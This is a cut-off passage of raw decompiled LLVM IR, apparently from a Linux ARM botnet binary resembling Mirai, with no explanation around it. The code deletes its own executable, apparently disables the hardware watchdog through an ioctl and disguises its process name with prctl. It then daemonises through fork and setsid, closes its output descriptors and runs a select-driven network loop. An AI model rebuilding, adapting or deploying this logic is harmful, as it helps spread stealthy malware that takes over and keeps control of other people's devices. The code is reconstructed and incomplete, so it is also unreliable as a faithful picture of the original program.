  %v6_101d8 = load i32, i32* @r5, align 4
  %v2_101e8 = ptrtoint i32* %stack_var_-464 to i32
  store i32 %v2_101e8, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_101f0 = load i32, i32* %arg2, align 4
  %v3_101f0 = inttoptr i32 %v2_101f0 to i8*
  %v3_101f8 = call i32 @unlink(i8* %v3_101f0)
  %v1_10200 = call i32 @_sigemptyset(i32 %v2_101e8)
  store i32 %v2_101e8, i32* @r0, align 4
  store i32 2, i32* @r1, align 4
  %v0_1020c = call i32 @_sigaddset()
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_1021c = call i32 @sigprocmask(i32 %v2_101e8, %_TYPEDEF_sigset_t* null, %_TYPEDEF_sigset_t* null)
  %v4_10228 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i32 1 to void (i32)*))
  %v4_10234 = call void (i32)* @signal(i32 5, void (i32)* bitcast (void (i32)** @global_var_ffc0.176 to void (i32)*))
  %v4_10240 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_143bc.178, i32 0, i32 0), i32 2)
  %v7_10244 = icmp eq i32 %v4_10240, -1
  store i32 %v4_10240, i32* %r4.global-to-local, align 4
  br i1 %v7_10244, label %dec_label_pc_105c8, label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %dec_label_pc_105c8, %dec_label_pc_101d8
  %v0_10264 = phi i32 [ %v4_105d0, %dec_label_pc_105c8 ], [ %v4_10240, %dec_label_pc_101d8 ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10268 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10268, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v5_10270 = call i32 @_ioctl(i32 %v0_10264, i32 -2147199228, i32 %v2_10268, i32 1, i32 1)
  %v0_10274 = load i32, i32* %r4.global-to-local, align 4
  %v1_10278 = call i32 @close(i32 %v0_10274)
  br label %dec_label_pc_1027c

dec_label_pc_1027c:                               ; preds = %dec_label_pc_105c8, %dec_label_pc_10250
  %v3_10280 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1436c.78, i32 0, i32 0))
  %v0_10284 = call i32 @function_13cc0()
  store i32 ptrtoint (i32* @global_var_1cda8.141 to i32), i32* @fp, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_102a0 = ptrtoint i8* %stack_var_-106 to i32
  store i32 2, i32* @r7, align 4
  store i8 80, i8* bitcast (i32* @global_var_1cdb7.173 to i8*), align 4
  store i32 902487617, i32* @global_var_1cdb8.172, align 4
  store i8 0, i8* bitcast (i32* @global_var_1cdb6.174 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1cdb5.183 to i8*), align 4
  store i32 %v0_10284, i32* @global_var_1cda8.141, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i8 2, i8* bitcast (i8** @global_var_1cdb4.171 to i8*), align 4
  %v0_102cc = load i32, i32* @r6, align 4
  %v1_102cc = inttoptr i32 %v0_102cc to i32*
  %v2_102cc = load i32, i32* %v1_102cc, align 4
  store i32 %v2_102cc, i32* @r5, align 4
  %v4_102d0 = call i32 @_memcpy(i32 %v2_102a0, i32 ptrtoint ([3 x i8]* @global_var_14410.185 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_1440c.200 to i32), i32* %r4.global-to-local, align 4
  store i32 add (i32 add (i32 ptrtoint (i32* @global_var_1302c.195 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_ffd8.188 to i32), i32 ptrtoint (i32* @global_var_130e4.190 to i32)), i32 77824), i32 ptrtoint (i32* @global_var_1319c.193 to i32))), i32 161900), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (void (i32)** @global_var_ffc0.176 to i32), i32* %r2.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_1302c.195 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_ffd8.188 to i32), i32 ptrtoint (i32* @global_var_130e4.190 to i32)), i32 77824), i32 ptrtoint (i32* @global_var_1319c.193 to i32))), i32 161900), i32 0), label %dec_label_pc_104cc, label %dec_label_pc_10338

dec_label_pc_10338:                               ; preds = %dec_label_pc_1027c
  %v3_10338 = load i8, i8* %stack_var_-106, align 1
  %v4_10338 = sext i8 %v3_10338 to i32
  store i32 %v4_10338, i32* %r2.global-to-local, align 4
  %v4_1033c = zext i8 %tmp36 to i32
  store i32 %v4_1033c, i32* %r3.global-to-local, align 4
  %v0_10340 = load i32, i32* @r5, align 4
  store i8 %tmp36, i8* %stack_var_-72, align 1
  %v1_1034c = inttoptr i32 %v0_10340 to i8*
  %v2_1034c = call i32 @function_13a08(i8* %v1_1034c)
  %v0_10354 = load i32, i32* @r7, align 4
  %v2_10358 = srem i32 %v0_10354, %v2_1034c
  %v4_1035c = zext i8 %tmp34 to i32
  store i32 %v4_1035c, i32* %r2.global-to-local, align 4
  %v4_10360 = zext i8 %tmp33 to i32
  store i32 %v4_10360, i32* %r3.global-to-local, align 4
  %v0_10364 = load i32, i32* @r5, align 4
  %v2_10364 = add i32 %v0_10364, %v2_10358
  %v3_10364 = inttoptr i32 %v2_10364 to i8*
  %v4_10364 = load i8, i8* %v3_10364, align 1
  %v6_10364 = zext i8 %v4_10364 to i32
  store i32 %v6_10364, i32* %r4.global-to-local, align 4
  %v1_10374 = inttoptr i32 %v0_10364 to i8*
  %v2_10374 = call i32 @function_13a08(i8* %v1_10374)
  %v2_10380 = srem i32 4, %v2_10374
  %v0_10384 = load i32, i32* %r4.global-to-local, align 4
  %v1_10384 = sub i32 -1, %v0_10384
  store i32 %v1_10384, i32* %r4.global-to-local, align 4
  %v0_10388 = load i32, i32* @r5, align 4
  %v2_10388 = add i32 %v0_10388, %v2_10380
  %v3_10388 = inttoptr i32 %v2_10388 to i8*
  %v4_10388 = load i8, i8* %v3_10388, align 1
  %v6_10388 = zext i8 %v4_10388 to i32
  %v4_1038c = zext i8 %tmp30 to i32
  store i32 %v4_1038c, i32* %r2.global-to-local, align 4
  %v1_10394 = sub i32 -82, %v0_10384
  %v1_10398 = sub nuw nsw i32 -1, %v6_10388
  store i32 %v1_10398, i32* %r3.global-to-local, align 4
  %v1_103a0 = urem i32 %v1_10394, 256
  %v2_103a4 = add nsw i32 %v1_103a0, %v1_10398
  store i32 %v2_103a4, i32* %r4.global-to-local, align 4
  %v1_103b0 = inttoptr i32 %v0_10388 to i8*
  %v2_103b0 = call i32 @function_13a08(i8* %v1_103b0)
  %v2_103bc = srem i32 6, %v2_103b0
  %v0_103c0 = load i32, i32* @r5, align 4
  %v2_103c0 = add i32 %v0_103c0, %v2_103bc
  %v3_103c0 = inttoptr i32 %v2_103c0 to i8*
  %v4_103c0 = load i8, i8* %v3_103c0, align 1
  %v6_103c0 = zext i8 %v4_103c0 to i32
  %v4_103c4 = zext i8 %tmp26 to i32
  store i32 %v4_103c4, i32* %r2.global-to-local, align 4
  %v1_103cc = sub nuw nsw i32 -1, %v6_103c0
  store i32 %v1_103cc, i32* %r3.global-to-local, align 4
  %v0_103d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_103d4 = urem i32 %v0_103d4, 256
  %v2_103d8 = add nsw i32 %v1_103d4, %v1_103cc
  store i32 %v2_103d8, i32* %r4.global-to-local, align 4
  %v1_103e4 = inttoptr i32 %v0_103c0 to i8*
  %v2_103e4 = call i32 @function_13a08(i8* %v1_103e4)
  %v2_103f0 = srem i32 8, %v2_103e4
  %v0_103f4 = load i32, i32* @r5, align 4
  %v2_103f4 = add i32 %v0_103f4, %v2_103f0
  %v3_103f4 = inttoptr i32 %v2_103f4 to i8*
  %v4_103f4 = load i8, i8* %v3_103f4, align 1
  %v6_103f4 = zext i8 %v4_103f4 to i32
  %v4_103f8 = zext i8 %tmp22 to i32
  store i32 %v4_103f8, i32* %r2.global-to-local, align 4
  %v1_10400 = sub nuw nsw i32 -1, %v6_103f4
  store i32 %v1_10400, i32* %r3.global-to-local, align 4
  %v0_10408 = load i32, i32* %r4.global-to-local, align 4
  %v1_10408 = urem i32 %v0_10408, 256
  %v2_1040c = add nsw i32 %v1_10408, %v1_10400
  store i32 %v2_1040c, i32* %r4.global-to-local, align 4
  %v1_10418 = inttoptr i32 %v0_103f4 to i8*
  %v2_10418 = call i32 @function_13a08(i8* %v1_10418)
  %v2_10424 = srem i32 10, %v2_10418
  %v0_10428 = load i32, i32* @r5, align 4
  %v2_10428 = add i32 %v0_10428, %v2_10424
  %v3_10428 = inttoptr i32 %v2_10428 to i8*
  %v4_10428 = load i8, i8* %v3_10428, align 1
  %v6_10428 = zext i8 %v4_10428 to i32
  %v4_1042c = zext i8 %tmp18 to i32
  store i32 %v4_1042c, i32* %r2.global-to-local, align 4
  %v1_10434 = sub nuw nsw i32 -1, %v6_10428
  store i32 %v1_10434, i32* %r3.global-to-local, align 4
  %v0_1043c = load i32, i32* %r4.global-to-local, align 4
  %v1_1043c = urem i32 %v0_1043c, 256
  %v2_10440 = add nsw i32 %v1_1043c, %v1_10434
  store i32 %v2_10440, i32* %r4.global-to-local, align 4
  %v1_1044c = inttoptr i32 %v0_10428 to i8*
  %v2_1044c = call i32 @function_13a08(i8* %v1_1044c)
  %v2_10458 = srem i32 12, %v2_1044c
  %v0_1045c = load i32, i32* @r5, align 4
  %v2_1045c = add i32 %v0_1045c, %v2_10458
  %v3_1045c = inttoptr i32 %v2_1045c to i8*
  %v4_1045c = load i8, i8* %v3_1045c, align 1
  %v6_1045c = zext i8 %v4_1045c to i32
  %v0_10460 = load i32, i32* %r4.global-to-local, align 4
  %v1_10464 = sub nuw nsw i32 -1, %v6_1045c
  store i32 %v1_10464, i32* %r3.global-to-local, align 4
  %fold = add i32 %v0_10460, %v1_10464
  %v1_10470 = urem i32 %fold, 256
  %v2_10474 = urem i32 %v1_10470, 9
  %v1_10478 = load i32, i32* @r7, align 4
  %v6_10478 = shl i32 %v2_10474, %v1_10478
  %v2_10480 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10480, i32* %r2.global-to-local, align 4
  %v1_10484 = and i32 %v6_10478, 1020
  %v2_1048c = add i32 %v1_10484, %v2_10480
  %v2_10490 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_10490, i32* %r4.global-to-local, align 4
  %v1_10498 = add i32 %v2_1048c, -172
  %v2_10498 = inttoptr i32 %v1_10498 to i32*
  %v3_10498 = load i32, i32* %v2_10498, align 4
  call void @__pseudo_branch(i32 %v3_10498)
  %v0_1049c = load i32, i32* @r5, align 4
  %v2_104a4 = inttoptr i32 %v0_1049c to i8*
  %v3_104a4 = call i32 @function_13de8(i8* %v2_104a4, i32 %v2_10490)
  store i32 %v3_104a4, i32* @r5, align 4
  %v2_104b4 = call i32 @function_13aa8(i32 %v2_102a0, i32 18)
  %v2_104c0 = call i32 @function_13aa8(i32 %v2_10490, i32 12)
  %v0_104c4 = load i32, i32* @r5, align 4
  %v1_104c4 = urem i32 %v0_104c4, 256
  %v2_104c4 = icmp eq i32 %v1_104c4, 0
  br i1 %v2_104c4, label %dec_label_pc_104cc, label %dec_label_pc_105e4

dec_label_pc_104cc:                               ; preds = %dec_label_pc_10338, %dec_label_pc_1027c, %dec_label_pc_105e4
  %v2_104d0 = ptrtoint i32* %stack_var_-138 to i32
  store i32 %v2_104d0, i32* @sl, align 4
  %v0_104d4 = call i32 @function_ffd8()
  %v1_104d8 = call i32 @function_10c30(i32 %v0_104d4)
  %v2_104e4 = call i32 @function_13aa8(i32 %v2_104d0, i32 32)
  %v0_104e8 = load i32, i32* @r8, align 4
  %v7_104e8 = icmp eq i32 %v0_104e8, 2
  br i1 %v7_104e8, label %dec_label_pc_105f0, label %dec_label_pc_104f0

dec_label_pc_104f0:                               ; preds = %dec_label_pc_105f0, %dec_label_pc_104cc, %dec_label_pc_10600
  %v0_104f0 = call i32 @function_10bd8()
  %v1_104f4 = mul i32 %v0_104f0, 4
  %v3_104f8 = and i32 %v1_104f4, 12
  %v2_10500 = ptrtoint i32* %stack_var_-170 to i32
  store i32 %v2_10500, i32* @r5, align 4
  %v1_10504 = add nuw nsw i32 %v3_104f8, 12
  store i32 %v1_10504, i32* @r4, align 4
  %v2_10510 = call i32 @function_10c8c(i32 %v2_10500, i32 %v1_10504)
  %v2_10518 = ptrtoint i32* %stack_var_-36 to i32
  %v1_1051c = load i32, i32* @r4, align 4
  %v2_1051c = add i32 %v1_1051c, %v2_10518
  store i32 %v2_1051c, i32* %r3.global-to-local, align 4
  %v0_10520 = load i32, i32* @r6, align 4
  %v1_10520 = inttoptr i32 %v0_10520 to i32*
  %v2_10520 = load i32, i32* %v1_10520, align 4
  store i32 %v2_10520, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  %v3_10528 = add i32 %v2_1051c, -134
  %v4_10528 = inttoptr i32 %v3_10528 to i8*
  store i8 0, i8* %v4_10528, align 1
  %v2_10530 = inttoptr i32 %v2_10520 to i8*
  %v3_10530 = call i32 @function_13a30(i8* %v2_10530, i32 %v2_10500)
  %v0_10534 = call i32 @function_10bd8()
  %v2_1053c = urem i32 %v0_10534, 6
  %v3_10540 = mul nuw nsw i32 %v2_1053c, 4
  %v1_10544 = add nuw nsw i32 %v3_10540, 12
  store i32 %v1_10544, i32* @r4, align 4
  %v2_10550 = call i32 @function_10c8c(i32 %v2_10500, i32 %v1_10544)
  store i32 %v2_10518, i32* @r2, align 4
  %v1_1055c = load i32, i32* @r4, align 4
  %v2_1055c = add i32 %v1_1055c, %v2_10518
  store i32 %v2_1055c, i32* %r3.global-to-local, align 4
  %v0_10560 = load i32, i32* @r6, align 4
  %v1_10560 = trunc i32 %v0_10560 to i8
  %v3_10560 = add i32 %v2_1055c, -134
  %v4_10560 = inttoptr i32 %v3_10560 to i8*
  store i8 %v1_10560, i8* %v4_10560, align 1
  store i32 %v2_10500, i32* @r1, align 4
  store i32 15, i32* @r0, align 4
  %v4_1056c = call i32 @_prctl(i32 15, i32 %v2_10500, i32 %v2_10518, i32 %v2_1055c)
  %v1_10574 = call i32 @function_130e4(i32 2)
  %v3_10580 = call i32 @function_13000(i32 2, i32* nonnull %stack_var_-44)
  %v3_10584 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10584, i32* %r2.global-to-local, align 4
  %v3_10590 = inttoptr i32 %v3_10580 to i32*
  %v4_10590 = call i32 @write(i32 1, i32* %v3_10590, i32 %v3_10584)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_105a0 = call i32 @write(i32 ptrtoint (i32* @global_var_143e0.202 to i32), i32* inttoptr (i32 1 to i32*), i32 1)
  %v1_105a8 = call i32 @function_1302c(i32 2)
  %v0_105ac = call i32 @fork()
  %v1_105b0 = load i32, i32* @r6, align 4
  %v7_105b4 = icmp sgt i32 %v0_105ac, %v1_105b0
  br i1 %v7_105b4, label %dec_label_pc_105b8, label %dec_label_pc_10628

dec_label_pc_105b8:                               ; preds = %dec_label_pc_104f0
  %v2_105c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_105c4, i32* %r4.global-to-local, align 4
  store i32 %v6_101d8, i32* %r5.global-to-local, align 4
  ret i32 0

dec_label_pc_105c8:                               ; preds = %dec_label_pc_101d8
  %v4_105d0 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_143cc.204, i32 0, i32 0), i32 2)
  %v3_105d4 = icmp eq i32 %v4_105d0, -1
  store i32 %v4_105d0, i32* %r4.global-to-local, align 4
  br i1 %v3_105d4, label %dec_label_pc_1027c, label %dec_label_pc_10250

dec_label_pc_105e4:                               ; preds = %dec_label_pc_10338
  %v1_105e8 = call i32 @raise(i32 5)
  br label %dec_label_pc_104cc

dec_label_pc_105f0:                               ; preds = %dec_label_pc_104cc
  %v0_105f0 = load i32, i32* @r6, align 4
  %v1_105f0 = add i32 %v0_105f0, 4
  %v2_105f0 = inttoptr i32 %v1_105f0 to i32*
  %v3_105f0 = load i32, i32* %v2_105f0, align 4
  %v1_105f4 = inttoptr i32 %v3_105f0 to i8*
  %v2_105f4 = call i32 @function_13a08(i8* %v1_105f4)
  %v8_105fc = icmp sgt i32 %v2_105f4, 31
  br i1 %v8_105fc, label %dec_label_pc_104f0, label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %dec_label_pc_105f0
  %v0_10600 = load i32, i32* @r6, align 4
  %v1_10600 = add i32 %v0_10600, 4
  %v2_10600 = inttoptr i32 %v1_10600 to i32*
  %v3_10600 = load i32, i32* %v2_10600, align 4
  store i32 %v2_104d0, i32* @r0, align 4
  %v2_10608 = bitcast i32* %stack_var_-138 to i8*
  %v3_10608 = call i32 @function_13a30(i8* %v2_10608, i32 %v3_10600)
  %v0_1060c = load i32, i32* @r6, align 4
  %v1_1060c = add i32 %v0_1060c, 4
  %v2_1060c = inttoptr i32 %v1_1060c to i32*
  %v3_1060c = load i32, i32* %v2_1060c, align 4
  store i32 %v3_1060c, i32* %r4.global-to-local, align 4
  %v1_10614 = inttoptr i32 %v3_1060c to i8*
  %v2_10614 = call i32 @function_13a08(i8* %v1_10614)
  %v0_1061c = load i32, i32* %r4.global-to-local, align 4
  %v2_10620 = call i32 @function_13aa8(i32 %v0_1061c, i32 %v2_10614)
  br label %dec_label_pc_104f0

dec_label_pc_10628:                               ; preds = %dec_label_pc_104f0
  %v1_10628 = call i32 @setsid()
  %v0_10630 = load i32, i32* @r6, align 4
  %v1_10634 = call i32 @close(i32 %v0_10630)
  %v1_1063c = call i32 @close(i32 1)
  %v1_10644 = call i32 @close(i32 2)
  %v2_10648 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_10648, i32* @r7, align 4
  %v1_1064c = call i32 @function_b2b0(i32 %v1_10644)
  store i32 ptrtoint (i32* @global_var_1cd04.206 to i32), i32* @sb, align 4
  %v1_10654 = call i32 @function_f828(i32 %v1_1064c)
  %v0_10658 = call i32 @function_11694()
  %v0_1065c = load i32, i32* @r6, align 4
  %v2_10664 = ptrtoint i32* %stack_var_-592 to i32
  store i32 %v2_10664, i32* @r6, align 4
  %v2_10668 = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_10668, i32* @r7, align 4
  %v2_109f8 = ptrtoint i8* %stack_var_-38 to i32
  %v2_1092c = ptrtoint i32* %stack_var_-1616 to i32
  %v2_10a1c = ptrtoint i32* %stack_var_-48 to i32
  %v1_10ab0 = bitcast i32* %stack_var_-138 to i8*
  %tmp83 = bitcast i32* %stack_var_-88 to %sockaddr*
  %v1_10a9c = sub i32 0, %v1_10628
  br label %dec_label_pc_1066c

dec_label_pc_1066c:                               ; preds = %dec_label_pc_1066c.backedge, %dec_label_pc_10628
  %v2_1067486 = phi i32 [ %v2_10664, %dec_label_pc_10628 ], [ %v2_1067486.pre, %dec_label_pc_1066c.backedge ]
  %stack_var_-37.0 = phi i8 [ %tmp12, %dec_label_pc_10628 ], [ %stack_var_-37.0.be, %dec_label_pc_1066c.backedge ]
  %stack_var_-1620.0 = phi i32 [ %v0_1065c, %dec_label_pc_10628 ], [ %stack_var_-1620.0.be, %dec_label_pc_1066c.backedge ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_1067488 = inttoptr i32 %v2_1067486 to i32*
  store i32 0, i32* %v4_1067488, align 4
  %v0_1067889 = load i32, i32* %r3.global-to-local, align 4
  %v1_1067890 = add i32 %v0_1067889, 4
  store i32 %v1_1067890, i32* %r3.global-to-local, align 4
  %v7_1067c91 = icmp eq i32 %v1_1067890, 128
  br i1 %v7_1067c91, label %dec_label_pc_10684, label %dec_label_pc_10674.dec_label_pc_10674_crit_edge

dec_label_pc_10674.dec_label_pc_10674_crit_edge:  ; preds = %dec_label_pc_1066c, %dec_label_pc_10674.dec_label_pc_10674_crit_edge
  %v1_1067892 = phi i32 [ %v1_10678, %dec_label_pc_10674.dec_label_pc_10674_crit_edge ], [ %v1_1067890, %dec_label_pc_1066c ]
  %v0_10674.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_10674 = load i32, i32* @r6, align 4
  %v3_10674 = add i32 %v2_10674, %v1_1067892
  %v4_10674 = inttoptr i32 %v3_10674 to i32*
  store i32 %v0_10674.pre, i32* %v4_10674, align 4
  %v0_10678 = load i32, i32* %r3.global-to-local, align 4
  %v1_10678 = add i32 %v0_10678, 4
  store i32 %v1_10678, i32* %r3.global-to-local, align 4
  %v7_1067c = icmp eq i32 %v1_10678, 128
  br i1 %v7_1067c, label %dec_label_pc_10684, label %dec_label_pc_10674.dec_label_pc_10674_crit_edge

dec_label_pc_10684:                               ; preds = %dec_label_pc_10674.dec_label_pc_10674_crit_edge, %dec_label_pc_1066c
  %v0_10684 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10684, i32* %r3.global-to-local, align 4
  store i32 %v0_10684, i32* %r4.global-to-local, align 4
  %v2_1068c93 = load i32, i32* @r7, align 4
  %v3_1068c94 = add i32 %v2_1068c93, %v0_10684
  %v4_1068c95 = inttoptr i32 %v3_1068c94 to i32*
  store i32 %v0_10684, i32* %v4_1068c95, align 4
  %v0_1069096 = load i32, i32* %r3.global-to-local, align 4
  %v1_1069097 = add i32 %v0_1069096, 4
  store i32 %v1_1069097, i32* %r3.global-to-local, align 4
  %v7_1069498 = icmp eq i32 %v1_1069097, 128
  br i1 %v7_1069498, label %dec_label_pc_1069c, label %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge

dec_label_pc_1068c.dec_label_pc_1068c_crit_edge:  ; preds = %dec_label_pc_10684, %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge
  %v1_1069099 = phi i32 [ %v1_10690, %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge ], [ %v1_1069097, %dec_label_pc_10684 ]
  %v0_1068c.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1068c = load i32, i32* @r7, align 4
  %v3_1068c = add i32 %v2_1068c, %v1_1069099
  %v4_1068c = inttoptr i32 %v3_1068c to i32*
  store i32 %v0_1068c.pre, i32* %v4_1068c, align 4
  %v0_10690 = load i32, i32* %r3.global-to-local, align 4
  %v1_10690 = add i32 %v0_10690, 4
  store i32 %v1_10690, i32* %r3.global-to-local, align 4
  %v7_10694 = icmp eq i32 %v1_10690, 128
  br i1 %v7_10694, label %dec_label_pc_1069c, label %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge

dec_label_pc_1069c:                               ; preds = %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge, %dec_label_pc_10684
  store i32 ptrtoint (i32* @global_var_1cd00.166 to i32), i32* %r3.global-to-local, align 4
  %v2_106a0 = load i32, i32* @global_var_1cd00.166, align 4
  %v7_106a4 = icmp eq i32 %v2_106a0, -1
  br i1 %v7_106a4, label %dec_label_pc_106d4, label %dec_label_pc_106ac

dec_label_pc_106ac:                               ; preds = %dec_label_pc_1069c
  %v3_106ac = udiv i32 %v2_106a0, 32
  %v3_106b4 = mul nuw nsw i32 %v3_106ac, 4
  %v2_106bc = add i32 %v3_106b4, %v2_10518
  store i32 %v2_106bc, i32* %r3.global-to-local, align 4
  %v1_106c0 = add i32 %v2_106bc, -556
  %v2_106c0 = inttoptr i32 %v1_106c0 to i32*
  %v3_106c0 = load i32, i32* %v2_106c0, align 4
  %v1_106c4 = urem i32 %v2_106a0, 32
  %v7_106cc = shl i32 1, %v1_106c4
  %v8_106cc = or i32 %v3_106c0, %v7_106cc
  store i32 %v8_106cc, i32* %r2.global-to-local, align 4
  store i32 %v8_106cc, i32* %v2_106c0, align 4
  br label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %dec_label_pc_1069c, %dec_label_pc_106ac
  %v2_106d4 = load i32, i32* @global_var_1cd04.206, align 4
  store i32 %v2_106d4, i32* %r3.global-to-local, align 4
  %v7_106d8 = icmp eq i32 %v2_106d4, -1
  br i1 %v7_106d8, label %dec_label_pc_1097c, label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106d4
  store i32 ptrtoint (i8** @global_var_1cd5c.209 to i32), i32* %r2.global-to-local, align 4
  %v2_106e8 = load i8, i8* bitcast (i8** @global_var_1cd5c.209 to i8*), align 4
  %v3_106e8 = zext i8 %v2_106e8 to i32
  store i32 %v3_106e8, i32* %r3.global-to-local, align 4
  %v2_106ec = icmp eq i8 %v2_106e8, 0
  %v3_10844 = udiv i32 %v2_106d4, 32
  br i1 %v2_106ec, label %dec_label_pc_1083c, label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106e4
  %v3_10700 = mul nuw nsw i32 %v3_10844, 4
  %v2_10708 = add i32 %v3_10700, %v2_10518
  store i32 %v2_10708, i32* %r3.global-to-local, align 4
  %v1_1070c = add i32 %v2_10708, -300
  %v2_1070c = inttoptr i32 %v1_1070c to i32*
  %v3_1070c = load i32, i32* %v2_1070c, align 4
  %v1_10710 = urem i32 %v2_106d4, 32
  %v7_10718 = shl i32 1, %v1_10710
  %v8_10718 = or i32 %v3_1070c, %v7_10718
  store i32 %v8_10718, i32* %r2.global-to-local, align 4
  store i32 %v8_10718, i32* %v2_1070c, align 4
  br label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %dec_label_pc_1083c, %dec_label_pc_106f4
  %v2_10724 = load i32, i32* @global_var_1cd00.166, align 4
  %v2_10728 = load i32, i32* @global_var_1cd04.206, align 4
  store i32 %v2_10728, i32* %r3.global-to-local, align 4
  %v5_10734 = icmp slt i32 %v2_10724, %v2_10728
  br i1 %v5_10734, label %bb, label %bb84

bb:                                               ; preds = %dec_label_pc_10720
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_10720, %bb
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_10668, i32* %r2.global-to-local, align 4
  %v0_1075c = call i32 @_select()
  %v8_10760 = icmp eq i32 %v0_1075c, -1
  store i32 %v0_1075c, i32* %r3.global-to-local, align 4
  br i1 %v8_10760, label %dec_label_pc_1066c.backedge, label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %bb84
  %v1_1075c = trunc i32 %v0_1075c to i8
  %v3_1076c = icmp eq i8 %v1_1075c, 0
  br i1 %v3_1076c, label %dec_label_pc_10774, label %dec_label_pc_1079c

dec_label_pc_10774:                               ; preds = %dec_label_pc_1076c
  store i8 0, i8* %stack_var_-38, align 1
  %v2_10784 = srem i32 %stack_var_-1620.0, 6
  %v2_1078c = icmp eq i32 %v2_10784, 0
  %v1_10790 = add i32 %stack_var_-1620.0, 1
  store i32 %v1_10790, i32* %r2.global-to-local, align 4
  br i1 %v2_1078c, label %dec_label_pc_109ec, label %dec_label_pc_1079c

dec_label_pc_1079c:                               ; preds = %dec_label_pc_1076c, %dec_label_pc_10774, %dec_label_pc_109ec
  %stack_var_-37.1 = phi i8 [ 0, %dec_label_pc_109ec ], [ 0, %dec_label_pc_10774 ], [ %stack_var_-37.0, %dec_label_pc_1076c ]
  %stack_var_-1620.1 = phi i32 [ %v1_10790, %dec_label_pc_109ec ], [ %v1_10790, %dec_label_pc_10774 ], [ %stack_var_-1620.0, %dec_label_pc_1076c ]
  store i32 ptrtoint (i32* @global_var_1cd00.166 to i32), i32* %r3.global-to-local, align 4
  %v2_107a0 = load i32, i32* @global_var_1cd00.166, align 4
  %v7_107a4 = icmp eq i32 %v2_107a0, -1
  br i1 %v7_107a4, label %dec_label_pc_107d4, label %dec_label_pc_107ac

dec_label_pc_107ac:                               ; preds = %dec_label_pc_1079c
  %v3_107ac = udiv i32 %v2_107a0, 32
  %v3_107b4 = mul nuw nsw i32 %v3_107ac, 4
  store i32 %v2_10518, i32* @ip, align 4
  %v2_107bc = add i32 %v3_107b4, %v2_10518
  store i32 %v2_107bc, i32* %r3.global-to-local, align 4
  %v1_107c0 = add i32 %v2_107bc, -556
  %v2_107c0 = inttoptr i32 %v1_107c0 to i32*
  %v3_107c0 = load i32, i32* %v2_107c0, align 4
  %v1_107c4 = urem i32 %v2_107a0, 32
  %v6_107c8 = lshr i32 %v3_107c0, %v1_107c4
  store i32 %v6_107c8, i32* %r2.global-to-local, align 4
  %v1_107cc = urem i32 %v6_107c8, 2
  %v2_107cc = icmp eq i32 %v1_107cc, 0
  store i1 %v2_107cc, i1* @cpsr_z, align 1
  br i1 %v2_107cc, label %dec_label_pc_107d4, label %dec_label_pc_10a6c

dec_label_pc_107d4:                               ; preds = %dec_label_pc_107ac, %dec_label_pc_1079c
  store i32 ptrtoint (i8** @global_var_1cd5c.209 to i32), i32* %r3.global-to-local, align 4
  %v2_107d8 = load i8, i8* bitcast (i8** @global_var_1cd5c.209 to i8*), align 4
  %v3_107d8 = zext i8 %v2_107d8 to i32
  store i32 %v3_107d8, i32* %r4.global-to-local, align 4
  %v2_107dc = icmp eq i8 %v2_107d8, 0
  %v2_1086c = load i32, i32* @global_var_1cd04.206, align 4
  br i1 %v2_107dc, label %dec_label_pc_1086c, label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107d4
  %v3_107ec = udiv i32 %v2_1086c, 32
  %v3_107f4 = mul nuw nsw i32 %v3_107ec, 4
  %v2_107f8 = add i32 %v3_107f4, %v2_10518
  store i32 %v2_107f8, i32* %r3.global-to-local, align 4
  %v1_107fc = add i32 %v2_107f8, -300
  %v2_107fc = inttoptr i32 %v1_107fc to i32*
  %v3_107fc = load i32, i32* %v2_107fc, align 4
  %v1_10800 = urem i32 %v2_1086c, 32
  %v6_10804 = lshr i32 %v3_107fc, %v1_10800
  store i32 %v6_10804, i32* %r2.global-to-local, align 4
